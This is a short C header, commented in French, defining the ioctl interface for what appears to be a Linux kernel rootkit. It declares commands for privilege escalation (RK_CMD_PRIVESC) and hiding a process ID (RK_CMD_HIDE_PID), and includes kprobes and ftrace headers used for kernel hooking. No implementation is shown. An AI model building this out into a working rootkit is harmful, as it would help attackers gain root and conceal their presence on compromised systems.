#ifndef RK_PROTO_H
#define RK_PROTO_H

#include <linux/ioctl.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/ptrace.h>
#include <linux/string.h>

#define RK_MAGIC 0xDE
# define MCOUNT_INSN_SIZE 5

/* Structure d'arguments passee a chaque commande */
struct rk_args {
    unsigned int target;   /* PID, UID, ou autre identifiant */
    unsigned int value;    /* parametre supplementaire selon la commande */
};

/* Definition des commandes ioctl
 *   _IOW  = userspace ecrit vers le noyau  (write)
 *   _IOR  = noyau ecrit vers userspace     (read)
 *   _IOWR = les deux
 *
 *   Arguments : magic, numero de commande, type de la structure
 */
#define RK_CMD_HELLO    _IO  (RK_MAGIC, 0)
#define RK_CMD_PRIVESC  _IOW (RK_MAGIC, 1, struct rk_args)
#define RK_CMD_HIDE_PID _IOW (RK_MAGIC, 2, struct rk_args)
#define RK_CMD_GETUID   _IOR (RK_MAGIC, 3, struct rk_args)

#endif /* RK_PROTO_H */
